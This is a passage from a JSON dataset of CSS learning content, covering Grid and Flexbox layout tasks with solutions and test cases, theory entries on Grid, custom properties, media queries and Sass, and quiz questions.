place-items: center; /* Shorthand for align-items: center; justify-items: center; */\n\n  /* Align the entire grid content within the container */\n  justify-content: center; /* Center horizontally */\n  align-content: center;   /* Center vertically, if there's extra vertical space */\n}\n\n.gallery-item {\n  background-color: #fff;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n  padding: 10px;\n  /* The img inside is already centered using flex on the item itself */\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.gallery-item img {\n  width: 150px;\n  height: 150px;\n  object-fit: cover;\n  border-radius: 4px;\n}\n```",
          "testCases": [
            "**Test Case 1: Item Centering**\nExpected: Each `.gallery-item` (and thus the `img` inside it) should be perfectly centered within its individual grid cell, both horizontally and vertically. This should be visible because the cell is larger than the 150px image.\n",
            "**Test Case 2: Grid Content Centering (Horizontal)**\nExpected: When the browser window is wide enough that the total width of the grid columns is less than the `.gallery-container`'s width, the *entire block of grid items* should be horizontally centered within `.gallery-container`.\n",
            "**Test Case 3: Grid Content Centering (Vertical)**\nExpected: If the `.gallery-container` has a `min-height` that makes it taller than the total height of its grid rows, the *entire block of grid items* should be vertically centered within `.gallery-container`.\n",
            "**Test Case 4: Responsiveness**\nExpected: As the browser window resizes, the number of columns should adjust (`auto-fit, minmax`), and the centering rules should remain applied correctly."
          ],
          "hints": [
            "To center items within their cells, consider `place-items` on the container.",
            "To center the entire grid within its container, consider `place-content` on the container.",
            "`auto-fit` will help ensure your items expand to fill the row when there aren't enough items for a full row."
          ],
          "tags": [
            "CSS Grid",
            "Alignment",
            "Responsive Design",
            "Gallery",
            "place-items",
            "place-content"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts",
            "CSS Grid Alignment"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "justify-items",
            "align-items",
            "justify-content",
            "align-content",
            "minmax",
            "auto-fit"
          ]
        },
        {
          "id": "task_grid_flexbox_dashboard_layout",
          "title": "Build a Responsive Dashboard Layout Combining Grid and Flexbox",
          "description": "\nCreate a responsive dashboard layout that demonstrates the combined power of CSS Grid for macro-layout and Flexbox for micro-layout within components.\n\n1.  **Overall Layout (Grid):**\n    *   Create a main `.dashboard-layout` container using CSS Grid.\n    *   Define a layout with a header, a main content area, and a sidebar. The main content should be in the center, and the sidebar on the left.\n    *   Use `grid-template-areas` for a clear, readable structure (e.g., `header`, `sidebar`, `main`). Ensure the header spans all columns.\n    *   Columns could be `1fr 4fr` (sidebar, main). Rows could be `auto 1fr` (header, content).\n\n2.  **Dashboard Cards (Flexbox within Grid):**\n    *   Inside the `main` content area, create a container for `.dashboard-cards`.\n    *   Use **Flexbox** for `.dashboard-cards` to display multiple `.card` components. These cards should wrap to new lines, be evenly spaced, and grow/shrink flexibly.\n    *   Each `.card` should contain a title and some text, aligned vertically using Flexbox internally.\n\n3.  **Navigation (Flexbox within Header):**\n    *   Inside the `header`, create a `.nav-links` container.\n    *   Use **Flexbox** for `.nav-links` to display a horizontal list of navigation items, spaced appropriately (e.g., `space-around`).\n\n4.  Add basic styling to make all sections and components visible.\n",
          "difficulty": "hard",
          "startingCode": "```html\n<div class=\"dashboard-layout\">\n  <header class=\"dashboard-header\">\n    <h1>Dashboard</h1>\n    <nav class=\"nav-links\">\n      <a href=\"#\">Home</a>\n      <a href=\"#\">Analytics</a>\n      <a href=\"#\">Settings</a>\n    </nav>\n  </header>\n  <aside class=\"dashboard-sidebar\">\n    <h3>Navigation</h3>\n    <ul>\n      <li>Link 1</li>\n      <li>Link 2</li>\n      <li>Link 3</li>\n    </ul>\n  </aside>\n  <main class=\"dashboard-main-content\">\n    <h2>Overview</h2>\n    <div class=\"dashboard-cards\">\n      <div class=\"card\"><h4>Users</h4><p>1,234</p></div>\n      <div class=\"card\"><h4>Revenue</h4><p>$5,678</p></div>\n      <div class=\"card\"><h4>Orders</h4><p>901</p></div>\n      <div class=\"card\"><h4>Products</h4><p>256</p></div>\n    </div>\n  </main>\n</div>\n```\n```css\nbody {\n  margin: 0;\n  font-family: sans-serif;\n  background-color: #f0f2f5;\n}\n\n.dashboard-layout {\n  /* Grid properties here */\n  min-height: 100vh;\n  gap: 20px;\n}\n\n.dashboard-header {\n  background-color: #3f51b5;\n  color: white;\n  padding: 20px;\n  /* Flexbox for nav-links here */\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n.nav-links {\n  /* Flexbox properties here */\n}\n\n.nav-links a {\n  color: white;\n  text-decoration: none;\n  padding: 8px 15px;\n  border-radius: 4px;\n  transition: background-color 0.3s ease;\n}\n.nav-links a:hover { background-color: rgba(255,255,255,0.2); }\n\n.dashboard-sidebar {\n  background-color: #fff;\n  padding: 20px;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n}\n.dashboard-sidebar ul { list-style: none; padding: 0; }\n.dashboard-sidebar li { padding: 8px 0; border-bottom: 1px solid #eee; }\n\n.dashboard-main-content {\n  background-color: #fff;\n  padding: 20px;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n}\n\n.dashboard-cards {\n  /* Flexbox properties for cards here */\n  margin-top: 20px;\n  gap: 20px;\n}\n\n.card {\n  background-color: #e8f5e9;\n  border: 1px solid #c8e6c9;\n  padding: 15px;\n  border-radius: 8px;\n  box-shadow: 0 1px 3px rgba(0,0,0,0.1);\n  text-align: center;\n  /* Flexbox properties for card content */\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n  align-items: center;\n}\n.card h4 { margin: 0 0 10px 0; color: #4caf50; }\n.card p { margin: 0; font-size: 1.5em; font-weight: bold; color: #333; }\n```",
          "solutionCode": "```html\n<div class=\"dashboard-layout\">\n  <header class=\"dashboard-header\">\n    <h1>Dashboard</h1>\n    <nav class=\"nav-links\">\n      <a href=\"#\">Home</a>\n      <a href=\"#\">Analytics</a>\n      <a href=\"#\">Reports</a>\n      <a href=\"#\">Settings</a>\n      <a href=\"#\">Profile</a>\n    </nav>\n  </header>\n  <aside class=\"dashboard-sidebar\">\n    <h3>Navigation</h3>\n    <ul>\n      <li>Link 1</li>\n      <li>Link 2</li>\n      <li>Link 3</li>\n      <li>Link 4</li>\n    </ul>\n  </aside>\n  <main class=\"dashboard-main-content\">\n    <h2>Overview</h2>\n    <div class=\"dashboard-cards\">\n      <div class=\"card\"><h4>Users</h4><p>1,234</p></div>\n      <div class=\"card\"><h4>Revenue</h4><p>$5,678</p></div>\n      <div class=\"card\"><h4>Orders</h4><p>901</p></div>\n      <div class=\"card\"><h4>Products</h4><p>256</p></div>\n      <div class=\"card\"><h4>Support Tickets</h4><p>42</p></div>\n      <div class=\"card\"><h4>Conversions</h4><p>12.5%</p></div>\n    </div>\n  </main>\n</div>\n```\n```css\nbody {\n  margin: 0;\n  font-family: sans-serif;\n  background-color: #f0f2f5;\n}\n\n.dashboard-layout {\n  display: grid;\n  grid-template-columns: 200px 1fr; /* Fixed sidebar, flexible main content */\n  grid-template-rows: auto 1fr; /* Header auto, content fills remaining */\n  grid-template-areas:\n    \"header header\"\n    \"sidebar main\";\n  min-height: 100vh;\n  gap: 20px;\n}\n\n.dashboard-header {\n  grid-area: header;\n  background-color: #3f51b5;\n  color: white;\n  padding: 20px;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n.nav-links {\n  display: flex;\n  list-style: none;\n  padding: 0;\n  margin: 0;\n  gap: 15px; /* Spacing between nav items */\n}\n\n.nav-links a {\n  color: white;\n  text-decoration: none;\n  padding: 8px 15px;\n  border-radius: 4px;\n  transition: background-color 0.3s ease;\n}\n.nav-links a:hover { background-color: rgba(255,255,255,0.2); }\n\n.dashboard-sidebar {\n  grid-area: sidebar;\n  background-color: #fff;\n  padding: 20px;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n}\n.dashboard-sidebar ul { list-style: none; padding: 0; }\n.dashboard-sidebar li { padding: 8px 0; border-bottom: 1px solid #eee; }\n\n.dashboard-main-content {\n  grid-area: main;\n  background-color: #fff;\n  padding: 20px;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n}\n\n.dashboard-cards {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: space-around; /* Distribute cards in main content area */\n  margin-top: 20px;\n  gap: 20px;\n}\n\n.card {\n  background-color: #e8f5e9;\n  border: 1px solid #c8e6c9;\n  padding: 15px;\n  border-radius: 8px;\n  box-shadow: 0 1px 3px rgba(0,0,0,0.1);\n  text-align: center;\n  flex: 1 1 calc(33% - 40px); /* Flex grow/shrink, basis for ~3 cards per row with gap */\n  min-width: 200px; /* Ensure cards don't get too small */\n  max-width: 300px; /* Optional: limit card growth */\n  \n  /* Flexbox properties for card content */\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n  align-items: center;\n}\n.card h4 { margin: 0 0 10px 0; color: #4caf50; }\n.card p { margin: 0; font-size: 1.5em; font-weight: bold; color: #333; }\n```",
          "testCases": [
            "**Test Case 1: Overall Grid Structure**\nExpected: Header spans the top. Sidebar is on the left, 200px wide. Main content fills the remaining space to the right of the sidebar. The main content area should take up the remaining vertical space after the header.\n",
            "**Test Case 2: Header Navigation Responsiveness (Flexbox)**\nExpected: Navigation links in the header should be horizontally distributed (e.g., `space-between` or `space-around`). As the viewport shrinks, they should maintain their spacing and potentially wrap or become crowded (depending on specific `justify-content` and `flex-wrap`).\n",
            "**Test Case 3: Dashboard Cards Responsiveness (Flexbox)**\nExpected: The cards within the main content area should wrap onto new lines as the viewport width changes. They should distribute space evenly and potentially grow/shrink (within `flex` property constraints) to fill their row. When narrow, they should stack vertically.\n",
            "**Test Case 4: Combination Integrity**\nExpected: Verify that changes to the grid layout (e.g., resizing columns) correctly affect the overall structure, and changes to Flexbox properties (e.g., `flex-direction` on cards) only affect the internal layout of the respective Flexbox container, demonstrating proper layering of Grid and Flexbox."
          ],
          "hints": [
            "For the main grid layout, define `grid-template-columns`, `grid-template-rows`, and `grid-template-areas` on `.dashboard-layout`.",
            "Assign `grid-area` to `dashboard-header`, `dashboard-sidebar`, and `dashboard-main-content`.",
            "For the navigation links within the header, use `display: flex` on `.nav-links` and consider `justify-content` for horizontal distribution.",
            "For the `.dashboard-cards` container, use `display: flex` and `flex-wrap: wrap`. For individual `.card` items, `flex: 1 1 auto;` or `flex: 1 1 calc(width - gap);` can help with flexible sizing and wrapping."
          ],
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Responsive Design",
            "Dashboard",
            "Layout Combination",
            "Advanced"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts",
            "Flexbox Fundamentals",
            "CSS Grid Alignment"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "expert",
          "relatedConcepts": [
            "grid-template-areas",
            "flex-wrap",
            "justify-content",
            "align-items",
            "flex property",
            "responsive design principles"
          ]
        }
      ]
    }
  },
  {
    "id": "07eb964b-c4fc-4aca-b401-86f57f7715d6",
    "startLine": 12000,
    "endLine": 12099,
    "processedDate": "2025-06-17T12:42:53.083Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_css_grid",
          "title": "CSS Grid Layout",
          "content": "CSS Grid Layout is a powerful two-dimensional layout system for the web. It allows you to design complex responsive layouts more easily and consistently across different screen sizes. Unlike Flexbox, which is primarily a one-dimensional layout system (either row or column), CSS Grid can manage both rows and columns simultaneously, making it ideal for overall page layout or any component requiring precise alignment in both dimensions.\n\n## Key Concepts\n\n### Grid Container\nThe element on which `display: grid` is applied becomes a grid container. This container directly affects its immediate children, turning them into grid items.\n\n### Grid Items\nDirect children of the grid container become grid items. These items can then be positioned and sized within the grid structure.\n\n### Grid Tracks\nThese are the rows and columns that make up the grid. They are defined using properties like `grid-template-columns` and `grid-template-rows`.\n\n### `grid-template-columns` and `grid-template-rows`\nThese properties define the number and size of columns and rows in the grid. Values can be explicit lengths (px, em, rem), percentages, or flexible units like `fr` (fractional unit). `repeat()` function is very useful for creating multiple tracks of the same size.\n\n### `gap` (or `grid-gap`)\nThis property defines the space between grid tracks (rows and columns). It's a shorthand for `grid-row-gap` and `grid-column-gap`.\n\n### Positioning Grid Items (`grid-column`, `grid-row`)\nGrid items can be explicitly placed within the grid using these properties. They accept `line-start / line-end` values or `line-start / span N` values. `grid-column: 1 / 3` means the item starts at column line 1 and ends before column line 3 (spanning two columns). `grid-row: 2 / span 2` means it starts at row line 2 and spans 2 rows.",
          "examples": [
            {
              "id": "example_css_grid_1",
              "title": "Basic Grid Layout with Gaps",
              "code": "/* HTML Structure */\n<!-- <div class=\"container\">\n  <div class=\"item\">1</div>\n  <div class=\"item\">2</div>\n  <div class=\"item\">3</div>\n  <div class=\"item\">4</div>\n  <div class=\"item\">5</div>\n  <div class=\"item\">6</div>\n</div> -->\n\n/* CSS */\n.container {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr); /* Creates 3 equal-width columns */\n  gap: 20px; /* Adds 20px space between grid cells */\n  border: 1px solid blue;\n  padding: 10px;\n}\n\n.item {\n  background-color: lightblue;\n  border: 1px solid #ccc;\n  padding: 15px;\n  text-align: center;\n}",
              "explanation": "This example sets up a basic grid container with three equal-width columns using `repeat(3, 1fr)`. The `gap: 20px` property adds 20 pixels of space both horizontally and vertically between the grid items. The result is a flexible 3-column layout where items automatically flow into available cells.",
              "language": "css"
            },
            {
              "id": "example_css_grid_2",
              "title": "Positioning Grid Items and Spanning",
              "code": "/* HTML Structure */\n<!-- <div class=\"container-span\">\n  <div class=\"item\">1</div>\n  <div class=\"item special-item\">2 (Spans)</div>\n  <div class=\"item\">3</div>\n  <div class=\"item\">4</div>\n  <div class=\"item\">5</div>\n  <div class=\"item\">6</div>\n</div> -->\n\n/* CSS */\n.container-span {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr); /* 3 columns */\n  grid-template-rows: repeat(3, 100px); /* 3 rows, 100px height each */\n  gap: 10px;\n  border: 1px solid green;\n  padding: 10px;\n}\n\n.item {\n  background-color: lightcoral;\n  border: 1px solid #ccc;\n  padding: 15px;\n  text-align: center;\n}\n\n.special-item {\n  grid-column: 1 / 3; /* Starts at column line 1, ends before column line 3 (spans 2 columns) */\n  grid-row: 2 / span 2; /* Starts at row line 2, spans 2 rows */\n  background-color: lightgreen;\n}",
              "explanation": "This example demonstrates how to explicitly place and size a grid item. The `.special-item` uses `grid-column: 1 / 3` to occupy the first two columns (from line 1 to line 3). It also uses `grid-row: 2 / span 2` to start at row line 2 and stretch across two rows. This precise control over item placement is a key strength of CSS Grid.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Layout",
            "Grid",
            "Responsive Design"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "HTML_structure",
            "CSS_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "advanced_layout_techniques",
            "responsive_web_design"
          ]
        },
        {
          "id": "theory_css_variables",
          "title": "CSS Custom Properties (CSS Variables)",
          "content": "CSS Custom Properties, often referred to as CSS Variables, are entities defined by CSS authors that contain specific values to be reused throughout a document. They are cascading variables, meaning they inherit values from their parent elements and can be overridden at lower levels in the DOM tree. They are prefixed with `--` (e.g., `--primary-color`).\n\n## Key Benefits\n\n*   **Maintainability:** Centralize frequently used values (colors, font sizes, spacing) in one place. Changing a single variable updates all its occurrences, reducing repetitive code.\n*   **Theming:** Easily switch between themes (light/dark mode) by changing a few variable values.\n*   **Responsiveness:** Media queries can update variable values to adjust styles based on screen size.\n*   **Readability:** Semantic variable names improve the clarity of your CSS.\n*   **Dynamic Styling:** Unlike preprocessor variables (like Sass), CSS variables are live in the browser's runtime. This means they can be manipulated directly with JavaScript, enabling dynamic style changes without needing to rewrite entire style rules.\n\n## Usage\n\nCustom properties are declared within a selector, typically `:root` for global scope, but can also be declared on specific elements to create local scope. They are accessed using the `var()` function.\n\n```css\n/* Declaration */\n:root {\n  --main-bg-color: #f0f0f0;\n  --text-color: #333;\n}\n\n.my-component {\n  --component-bg: var(--main-bg-color);\n}\n\n/* Usage */\nbody {\n  background-color: var(--main-bg-color);\n  color: var(--text-color);\n}\n\n.header {\n  background-color: var(--component-bg);\n}\n\n/* Fallback values */\np {\n  color: var(--undefined-variable, red); /* If --undefined-variable is not set, use red */\n}\n```",
          "examples": [
            {
              "id": "example_css_variables_1",
              "title": "Basic CSS Variable Usage",
              "code": "/* HTML Structure */\n<!-- <div class=\"container\">\n  <button class=\"button\">Click Me</button>\n  <div class=\"alert\">Alert Message</div>\n</div> -->\n\n/* CSS */\n:root {\n  --primary-color: #007bff; /* Blue */\n  --secondary-color: #6c757d; /* Grey */\n  --font-size-base: 16px;\n}\n\n.button {\n  background-color: var(--primary-color);\n  color: white;\n  padding: 10px 15px;\n  border: none;\n  border-radius: 5px;\n  font-size: var(--font-size-base);\n}\n\n.alert {\n  color: var(--secondary-color);\n  border: 1px solid var(--secondary-color);\n  padding: 10px;\n  margin-top: 10px;\n  background-color: #e2e3e5;\n  font-size: var(--font-size-base);\n}",
              "explanation": "This example defines global CSS variables within the `:root` selector for primary color, secondary color, and base font size. These variables are then reused across `.button` and `.alert` classes. This approach centralizes common styles, making it easier to manage and update the design system.",
              "language": "css"
            },
            {
              "id": "example_css_variables_2",
              "title": "Dynamic Theming with JavaScript",
              "code": "/* HTML Structure */\n<!-- <button id=\"themeToggle\">Toggle Theme</button>\n<div class=\"themed-box\">This box will change theme</div> -->\n\n/* CSS */\n:root {\n  --bg-color: #f0f0f0;\n  --text-color: #333;\n  --border-color: #ccc;\n}\n\n:root.dark-theme {\n  --bg-color: #333;\n  --text-color: #f0f0f0;\n  --border-color: #666;\n}\n\n.themed-box {\n  background-color: var(--bg-color);\n  color: var(--text-color);\n  border: 1px solid var(--border-color);\n  padding: 20px;\n  margin-top: 20px;\n  width: 200px;\n  text-align: center;\n}\n\n/* JavaScript */\ndocument.getElementById('themeToggle').addEventListener('click', () => {\n  document.documentElement.classList.toggle('dark-theme');\n});",
              "explanation": "This example demonstrates how CSS variables facilitate dynamic theming. We define default colors in `:root`. When the `dark-theme` class is added to the `<html>` element (via `document.documentElement`), it overrides the variables, instantly changing the background, text, and border colors of elements that use these variables. JavaScript toggles this class, showcasing runtime manipulation of styles.",
              "language": "css, javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Variables",
            "Custom Properties",
            "Theming",
            "Maintainability",
            "Responsive Design"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "CSS_basics",
            "HTML_DOM"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "design_system_implementation",
            "dynamic_theming",
            "performance_optimization"
          ]
        },
        {
          "id": "theory_media_queries",
          "title": "Media Queries for Responsive Design",
          "content": "Media queries are a CSS technique that allows you to apply different styles based on device characteristics, most commonly screen width. They are a cornerstone of Responsive Web Design (RWD), enabling layouts and styles to adapt seamlessly to various screen sizes, from mobile phones to large desktop monitors.\n\n## Syntax\n\nMedia queries start with an `@media` rule, followed by a media type (e.g., `screen`, `print`) and one or more media features (e.g., `min-width`, `max-width`, `orientation`).\n\n```css\n@media <media-type> and (<media-feature>) {\n  /* CSS rules to apply */\n}\n```\n\n## Common Media Features\n\n*   `width`, `min-width`, `max-width`: Based on viewport width.\n*   `height`, `min-height`, `max-height`: Based on viewport height.\n*   `orientation`: `portrait` or `landscape`.\n*   `resolution`: Screen pixel density.\n*   `prefers-color-scheme`: User's preferred color scheme (e.g., `light`, `dark`).\n\n## Mobile-First Approach\n\nThe 'mobile-first' strategy is a best practice in responsive design. It involves writing base styles for the smallest screens (mobile devices) first, and then progressively enhancing the layout for larger screens using `min-width` media queries. This approach ensures that the fundamental content is always accessible and performant on mobile, and more complex styles are layered on for devices that can handle them.\n\n## Benefits of Mobile-First\n\n*   **Performance:** Mobile devices often have limited bandwidth and processing power. Starting with minimal styles for mobile and adding more for larger screens means faster load times and better performance on mobile.\n*   **User Experience:** Prioritizing mobile ensures a robust user experience for a large segment of users.\n*   **Simplicity:** It forces developers to focus on core content and functionality first, leading to cleaner code and design.\n*   **Scalability:** Easier to scale up from a simple mobile layout than to scale down a complex desktop layout.",
          "examples": [
            {
              "id": "example_media_queries_1",
              "title": "Mobile-First Responsive Typography",
              "code": "/* HTML Structure */\n<!-- <body>\n  <p>This text will change size based on screen width.</p>\n</body> -->\n\n/* CSS */\n/* Mobile first approach: Base styles for mobile (default for all screens) */\nbody {\n  font-family: Arial, sans-serif;\n  font-size: 16px; /* Base font size for mobile */\n  margin: 20px;\n}\n\n/* For tablets and up (min-width: 768px) */\n@media (min-width: 768px) {\n  body {\n    font-size: 18px; /* Larger font size for tablets */\n  }\n}\n\n/* For desktops and up (min-width: 1024px) */\n@media (min-width: 1024px) {\n  body {\n    font-size: 20px; /* Even larger font size for desktops */\n    line-height: 1.6;\n  }\n}",
              "explanation": "This example demonstrates the mobile-first approach. The base `font-size` of `16px` is applied to `body` globally, targeting mobile devices. Then, using `min-width` media queries, the font size is increased to `18px` for viewports 768px and wider (tablets), and further to `20px` for viewports 1024px and wider (desktops). This ensures a good reading experience across various screen sizes, starting from the smallest.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Responsive Design",
            "Media Queries",
            "Mobile-First",
            "Web Development"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "CSS_basics",
            "HTML_structure"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "frontend_development",
            "web_design",
            "accessibility"
          ]
        },
        {
          "id": "theory_css_preprocessors_sass",
          "title": "CSS Preprocessors: Sass/SCSS",
          "content": "CSS Preprocessors are scripting languages that extend the default capabilities of CSS. They allow you to use programming features like variables, nested rules, mixins, functions, and logical operations within your stylesheets. The code written in a preprocessor language (like Sass, Less, Stylus) is then compiled into standard CSS, which browsers can understand.\n\nSass (Syntactically Awesome Style Sheets) is one of the most popular CSS preprocessors. It has two syntaxes:\n*   **Sass (Indented Syntax):** Older syntax, uses indentation instead of semicolons and curly braces.\n*   **SCSS (Sassy CSS):** Newer, more widely adopted syntax that is a superset of CSS, meaning valid CSS is also valid SCSS. This makes it easier for developers to transition from pure CSS.\n\n## Key Sass/SCSS Features\n\n### 1. Variables\nSass variables are defined with a `$` prefix (e.g., `$primary-color`). They are used to store values that can be reused throughout the stylesheet, improving consistency and making global changes easier. Unlike CSS variables, Sass variables are processed at compile time, meaning they cannot be manipulated by JavaScript in the browser.\n\n### 2. Nesting\nNesting allows you to write CSS selectors inside other selectors, mimicking the HTML structure. This reduces repetition and makes the stylesheet more organized and readable, especially for complex component structures. However, excessive nesting can lead to over-qualified selectors and increased specificity, so it should be used judiciously.\n\n### 3. Mixins\nMixins are reusable blocks of CSS declarations. They allow you to group common styles, often including vendor prefixes or complex property sets, and then 'include' them in multiple places using the `@include` directive. Mixins can also accept arguments, making them highly flexible for generating dynamic CSS.\n\n## Benefits of Using CSS Preprocessors\n\n*   **Efficiency:** Write less code for more styles due to features like nesting and variables.\n*   **Maintainability:** Easier to manage and update large stylesheets.\n*   **Modularity:** Break down CSS into smaller, more manageable files and reuse code.\n*   **Readability:** Structured code improves understanding.\n*   **Functionality:** Access to programming logic (loops, conditionals, functions) not available in native CSS (though native CSS is catching up with features like `@property`).",
          "examples": [
            {
              "id": "example_sass_1",
              "title": "Sass Variables, Nesting, and Mixins",
              "code": "// Variables\n$primary-color: #007bff; // A vibrant blue\n$font-stack: 'Helvetica Neue', Helvetica, Arial, sans-serif;\n$base-spacing: 20px;\n\n// Mixins\n@mixin border-radius($radius) {\n  -webkit-border-radius: $radius;\n  -moz-border-radius: $radius;\n  border-radius: $radius;\n}\n\n@mixin flex-center {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n// Nesting and Usage\nbody {\n  font-family: $font-stack;\n  margin: 0;\n  padding: 0;\n}\n\nnav {\n  background-color: $primary-color;\n  padding: $base-spacing / 2; // Using arithmetic with variables\n\n  ul {\n    margin: 0;\n    padding: 0;\n    list-style: none;\n    @include flex-center;\n\n    li {\n      display: inline-block;\n      margin: 0 $base-spacing / 4;\n\n      a {\n        color: white;\n        text-decoration: none;\n        padding: 5px 10px;\n        &:hover {\n          text-decoration: underline;\n        }\n      }\n    }\n  }\n}\n\n.box {\n  width: 100px;\n  height: 100px;\n  background-color: lighten($primary-color, 20%); // Sass color function\n  @include border-radius(10px); // Include the mixin\n  margin-top: $base-spacing;\n  @include flex-center;\n  color: white;\n  font-weight: bold;\n}\n",
              "explanation": "This comprehensive Sass example showcases all three core features: \n1.  **Variables:** `$primary-color`, `$font-stack`, `$base-spacing` are defined and reused, promoting consistency.\n2.  **Nesting:** The `nav` and `ul`, `li`, `a` selectors are nested, reflecting the HTML structure and making the CSS more organized.\n3.  **Mixins:** `border-radius` and `flex-center` mixins are defined to encapsulate reusable CSS. `border-radius` takes an argument `$radius` for flexibility, and both are included using `@include`. \nIt also briefly demonstrates Sass arithmetic and built-in color functions (`lighten`). This code needs to be compiled to standard CSS for browser consumption.",
              "language": "scss"
            },
            {
              "id": "example_sass_compiled_css",
              "title": "Compiled CSS from Sass Example",
              "code": "body {\n  font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;\n  margin: 0;\n  padding: 0;\n}\n\nnav {\n  background-color: #007bff;\n  padding: 10px;\n}\nnav ul {\n  margin: 0;\n  padding: 0;\n  list-style: none;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\nnav ul li {\n  display: inline-block;\n  margin: 0 5px;\n}\nnav ul li a {\n  color: white;\n  text-decoration: none;\n  padding: 5px 10px;\n}\nnav ul li a:hover {\n  text-decoration: underline;\n}\n\n.box {\n  width: 100px;\n  height: 100px;\n  background-color: #66b0ff;\n  -webkit-border-radius: 10px;\n  -moz-border-radius: 10px;\n  border-radius: 10px;\n  margin-top: 20px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  color: white;\n  font-weight: bold;\n}",
              "explanation": "This is the resulting CSS code after the previous Sass/SCSS example is compiled. Notice how:\n*   Sass variables (`$primary-color`, etc.) are replaced with their actual values.\n*   Nesting has been flattened, with parent selectors prepended to child selectors (e.g., `nav ul li a`).\n*   Mixins (`@include border-radius(10px)`) have been expanded into their full CSS declarations, including vendor prefixes. This is the code that web browsers actually interpret.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS Preprocessors",
            "Sass",
            "SCSS",
            "Variables",
            "Nesting",
            "Mixins",
            "Build Tools",
            "Frontend Architecture"
          ],
          "technology": "Sass/SCSS",
          "prerequisites": [
            "CSS_basics",
            "command_line_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "large_scale_css",
            "design_system_development",
            "frontend_tooling"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_css_grid_1",
          "topic": "CSS Grid Layout Fundamentals",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary difference between CSS Grid and Flexbox in terms of layout dimensions?",
          "answer": "CSS Grid is a two-dimensional layout system (rows and columns simultaneously), whereas Flexbox is primarily a one-dimensional layout system (either rows OR columns).",
          "analysisPoints": [],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "2D layout",
            "1D layout"
          ],
          "evaluationCriteria": [
            "Understanding of fundamental layout concepts",
            "Ability to differentiate core features"
          ],
          "example": "",
          "tags": [
            "CSS",
            "Layout",
            "Grid",
            "Flexbox"
          ],
          "prerequisites": [
            "CSS_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_grid_2",
          "topic": "CSS Grid Properties",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following CSS, what will be the layout of the grid items?\n\n```css\n.container {\n  display: grid;\n  grid-template-columns: 1fr 2fr 1fr;\n  gap: 10px;\n}\n.item-a {\n  grid-column: 1 / span 2;\n}\n.item-b {\n  grid-row: 2 / span 1;\n}\n```\n\nA. Three columns of equal width with 10px gaps.\nB. The first column will be 1/4 width, second 2/4 width, third 1/4 width. `item-a` will span the first two columns. `item-b` will be in the second row, spanning one row.\nC. `item-a` will span from the start of the first column to the end of the second column line. `item-b` will occupy the second row.\nD. The grid will have three columns, where the second column is twice as wide as the first and third. `item-a` will span the first two columns. `item-b` will start at row line 2 and occupy a single row.",
          "answer": "D. The grid will have three columns, where the second column is twice as wide as the first and third. `item-a` will span the first two columns. `item-b` will start at row line 2 and occupy a single row.",
          "options": [
            "A. Three columns of equal width with 10px gaps.",
            "B. The first column will be 1/4 width, second 2/4 width, third 1/4 width. `item-a` will span the first two columns. `item-b` will be in the second row, spanning one row.",
            "C. `item-a` will span from the start of the first column to the end of the second column line. `item-b` will occupy the second row.",
            "D. The grid will have three columns, where the second column is twice as wide as the first and third. `item-a` will span the first two columns. `item-b` will start at row line 2 and occupy a single row."
          ],
          "analysisPoints": [
            "Understanding of `fr` unit: `1fr 2fr 1fr` means widths are proportional (1:2:1 ratio).",
            "Understanding of `grid-column: start / span N`: The item starts at `start` line and occupies `N` tracks.",
            "Understanding of `grid-row: start / span N`: The item starts at `start` line and occupies `N` tracks.",
            "Identifying correct grid line numbers vs. track numbers."
          ],
          "keyConcepts": [
            "CSS Grid",
            "grid-template-columns",
            "fr unit",
            "grid-column",
            "grid-row",
            "span keyword",
            "gap"
          ],
          "evaluationCriteria": [
            "Ability to interpret grid track sizing",
            "Correctly apply `span` keyword for item placement",
            "Understanding of implicit grid rows for `item-b`"
          ],
